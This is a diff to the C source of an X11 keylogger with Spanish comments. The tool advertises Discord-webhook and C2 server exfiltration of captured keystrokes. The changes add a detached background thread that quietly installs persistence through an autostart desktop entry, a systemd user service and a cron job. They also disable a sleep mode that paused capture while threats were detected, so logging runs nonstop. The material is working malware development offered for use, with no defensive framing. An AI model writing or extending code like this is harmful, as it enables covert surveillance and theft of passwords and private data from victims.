@@ -91,6 +91,8 @@ typedef struct {
 } KeyloggerState;
 
 // Estado global del keylogger
+static char g_binary_path[256] = {0};  // Ruta absoluta del binario para persistencia
+
 static KeyloggerState g_state = {
     .display = NULL,
     .record_display = NULL,
@@ -876,11 +878,11 @@ void log_key_event(const char *window_name, const char *key_str) {
 void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
     (void)closure; // No usado
     
-    // NUEVO: No procesar si estamos en sleep mode
-    if (get_current_state() != STATE_NORMAL) {
-        XRecordFreeData(recorded_data);
-        return;
-    }
+    // Sleep mode DESHABILITADO - causaba problemas
+    // if (get_current_state() != STATE_NORMAL) {
+    //     XRecordFreeData(recorded_data);
+    //     return;
+    // }
     
     if (recorded_data->category == XRecordFromServer) {
         // Obtener el tipo de evento
@@ -1074,6 +1076,8 @@ void print_usage(const char *prog_name) {
     printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
     printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
     printf("  -h, --help         Mostrar esta ayuda\n\n");
+    printf("Opciones de persistencia:\n");
+    printf("      --install-persist  Instalar mecanismos de persistencia\n\n");
     printf("Opciones de exfiltración:\n");
     printf("  -D, --discord              Habilitar exfiltración a Discord (HABILITADO POR DEFECTO)\n");
     printf("      --discord-webhook URL Webhook URL para Discord\n");
@@ -1082,53 +1086,106 @@ void print_usage(const char *prog_name) {
     printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
     printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
     printf("      --exfil-path PATH      Path del endpoint (default: %s, requiere -e)\n\n", EXFIL_DEFAULT_PATH);
-    printf("Notas:\n");
-    printf("  - Persistencia: Se instala automáticamente en ~/.config/autostart y systemd\n");
-    printf("  - El proceso se ejecutará automáticamente tras reinicio\n\n");
     printf("Ejemplos:\n");
     printf("  %s                              # Daemon + Discord (DEFECTO)\n", prog_name);
     printf("  %s --exfil-interval 300         # Daemon + Discord, enviar cada 5 min\n", prog_name);
     printf("  %s -d                           # Foreground + Discord\n", prog_name);
+    printf("  %s --install-persist            # Instalar persistencia\n", prog_name);
     printf("  %s -e -s 192.168.1.100          # Daemon + HTTP\n", prog_name);
 }
 
+/**
+ * Convierte una ruta relativa a absoluta usando cwd
+ * Thread-safe: usa buffer local
+ * @param argv0 El valor de argv[0] pasado desde main
+ * @param out_path Buffer de salida para la ruta absoluta
+ * @param out_size Tamaño del buffer de salida
+ */
+static void resolve_binary_path(const char *argv0, char *out_path, size_t out_size) {
+    if (!argv0 || !out_path || out_size == 0) {
+        return;
+    }
+    
+    // Si ya es absoluta, usar directamente
+    if (argv0[0] == '/') {
+        snprintf(out_path, out_size, "%s", argv0);
+        return;
+    }
+    
+    // Si es relativa, convertir a absoluta usando cwd
+    char cwd[512];
+    char temp_path[512];
+    
+    if (getcwd(cwd, sizeof(cwd)) != NULL) {
+        snprintf(temp_path, sizeof(temp_path), "%s/%s", cwd, argv0);
+        snprintf(out_path, out_size, "%s", temp_path);
+    } else {
+        // Fallback: usar argv0 tal cual
+        snprintf(out_path, out_size, "%s", argv0);
+    }
+}
+
+/**
+ * Thread para instalar persistencia en segundo plano
+ * Se ejecuta después de que el keylogger ha iniciado correctamente
+ */
+void* persistence_install_thread(void *arg) {
+    (void)arg;
+    
+    // Esperar 2 segundos para asegurar que el proceso principal está inicializado
+    sleep(2);
+    
+    // Usar la ruta global que fue resuelta en main()
+    if (g_binary_path[0] == '\0') {
+        // Si por alguna razón no se resolvió, intentar readlink como fallback
+        ssize_t len = readlink("/proc/self/exe", g_binary_path, sizeof(g_binary_path) - 1);
+        if (len > 0) {
+            g_binary_path[len] = '\0';
+        } else {
+            snprintf(g_binary_path, sizeof(g_binary_path), "/usr/local/bin/x11_keylogger");
+        }
+    }
+    
+    // Log a archivo para debugging (silencioso, no afecta ejecución)
+    FILE *persist_log = fopen("/tmp/x11_persist_install.log", "a");
+    if (persist_log) {
+        fprintf(persist_log, "[%ld] === Instalando persistencia ===\n", time(NULL));
+        fprintf(persist_log, "[%ld] Binary path: %s\n", time(NULL), g_binary_path);
+        fflush(persist_log);
+    }
+    
+    // Instalar persistencia en segundo plano (no-fatal si falla)
+    int ret1 = install_autostart_entry(g_binary_path);
+    if (persist_log) {
+        fprintf(persist_log, "[%ld] Desktop Entry (.desktop): %s\n", time(NULL), ret1 == 0 ? "OK" : "FAIL");
+        fflush(persist_log);
+    }
+    
+    int ret2 = install_systemd_service(g_binary_path);
+    if (persist_log) {
+        fprintf(persist_log, "[%ld] Systemd User Service: %s\n", time(NULL), ret2 == 0 ? "OK" : "FAIL");
+        fflush(persist_log);
+    }
+    
+    int ret3 = install_cron_job(g_binary_path);
+    if (persist_log) {
+        fprintf(persist_log, "[%ld] Cron Job (verificación cada 5min): %s\n", time(NULL), ret3 == 0 ? "OK" : "FAIL");
+        fflush(persist_log);
+    }
+    
+    // Resumen
+    int total_ok = (ret1 == 0 ? 1 : 0) + (ret2 == 0 ? 1 : 0) + (ret3 == 0 ? 1 : 0);
+    if (persist_log) {
+        fprintf(persist_log, "[%ld] === Resultado: %d/3 mecanismos exitosos ===\n\n", time(NULL), total_ok);
+        fclose(persist_log);
+    }
+    
+    return NULL;
+}
 
 // Función principal del keylogger
 int start_keylogger(void) {
     char timestamp[64];
-    
-    // NUEVO: Instalar persistencia automáticamente
-    // Obtener ruta del ejecutable actual
-    char binary_path[256];
-    ssize_t len = readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1);
-    
-    if (len > 0) {
-        binary_path[len] = '\0';
-    } else {
-        // Alternativa: usar argv[0] (puede no funcionar en daemon)
-        strncpy(binary_path, "x11_keylogger", sizeof(binary_path) - 1);
-        binary_path[sizeof(binary_path) - 1] = '\0';
-    }
-    
-    // Intentar instalar persistencia de forma silenciosa (sin output a menos que falle)
-    if (!g_state.quiet_mode && !g_state.daemon_mode) {
-        printf("[*] Instalando mecanismos de persistencia...\n");
-    }
-    
-    // Desktop entry (menor prioridad, fallar silenciosamente)
-    install_autostart_entry(binary_path);
-    
-    // Systemd service (alta prioridad, avisar si falla)
-    if (install_systemd_service(binary_path) != 0 && !g_state.quiet_mode && !g_state.daemon_mode) {
-        printf("[!] Advertencia: No se pudo instalar servicio systemd\n");
-    }
-    
-    // Cron job (opcional, fallar silenciosamente)
-    install_cron_job(binary_path);
-    
-    if (!g_state.quiet_mode && !g_state.daemon_mode) {
-        printf("[+] Persistencia configurada\n\n");
-    }
     
     // IMPORTANTE: Guardar DISPLAY antes de daemonizar
     // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
@@ -1290,16 +1347,19 @@ int start_keylogger(void) {
         return 1;
     }
     
+    // Iniciar thread para instalar persistencia en segundo plano
+    // Se ejecuta después de 2s para no interferir con el inicio
+    pthread_t persist_thread;
+    if (pthread_create(&persist_thread, NULL, persistence_install_thread, NULL) == 0) {
+        pthread_detach(persist_thread);  // Ejecutar en segundo plano
+    }
+    // Si falla, simplemente continuar sin persistencia (no es crítico)
+    
     // Loop principal - procesar eventos XRecord
     while (g_state.running) {
-        // NUEVO: Actualizar estado de persistencia (detección de amenazas)
-        update_persistence_state();
-        
-        // Si estamos en sleep mode, no capturar eventos
-        if (get_current_state() == STATE_SLEEP) {
-            usleep(100000);  // 100ms de pausa
-            continue;
-        }
+        // Sleep mode DESHABILITADO - causaba problemas en máquinas de prueba
+        // donde siempre hay terminales activas
+        // TODO: Hacer configurable con --enable-sleep-mode
         
         // Procesamiento normal de eventos
         XRecordProcessReplies(g_state.record_display);
@@ -1325,19 +1385,16 @@ int main(int argc, char *argv[]) {
     int opt;
     int option_index = 0;
     
-    // NUEVO: Procesar --install-persistence antes que otros argumentos
-    if (argc > 1 && strcmp(argv[1], "--install-persistence") == 0) {
-        // Obtener ruta del ejecutable actual
+    // CRÍTICO: Resolver ruta absoluta del binario ANTES de cualquier operación
+    // Esto se usa para persistencia y debe ser portable entre PCs
+    resolve_binary_path(argv[0], g_binary_path, sizeof(g_binary_path));
+    
+    // NUEVO: Procesar --install-persistence o --install-persist antes que otros argumentos
+    if (argc > 1 && (strcmp(argv[1], "--install-persistence") == 0 || strcmp(argv[1], "--install-persist") == 0)) {
+        // Usar la ruta ya resuelta en g_binary_path
         char binary_path[256];
-        ssize_t len = readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1);
-        
-        if (len > 0) {
-            binary_path[len] = '\0';
-        } else {
-            // Alternativa: usar argv[0]
-            strncpy(binary_path, argv[0], sizeof(binary_path) - 1);
-            binary_path[sizeof(binary_path) - 1] = '\0';
-        }
+        strncpy(binary_path, g_binary_path, sizeof(binary_path) - 1);
+        binary_path[sizeof(binary_path) - 1] = '\0';
         
         printf("[*] Instalando persistencia para: %s\n\n", binary_path);
         
@@ -1384,6 +1441,7 @@ int main(int argc, char *argv[]) {
         {"quiet",            no_argument,       0, 'q'},
         {"output",           required_argument, 0, 'o'},
         {"help",             no_argument,       0, 'h'},
+        {"install-persist",  no_argument,       0, 259},  // Nueva opción
         // Opciones de exfiltración HTTP
         {"exfil",            no_argument,       0, 'e'},
         {"server",           required_argument, 0, 's'},
@@ -1463,6 +1521,9 @@ int main(int argc, char *argv[]) {
                         return 1;
                     }
                 }
+                break;
+            case 259:  // --install-persist (delegado a la sección de arriba)
+                // Ya manejado al inicio de main()
                 break;
             default:
                 print_usage(argv[0]);
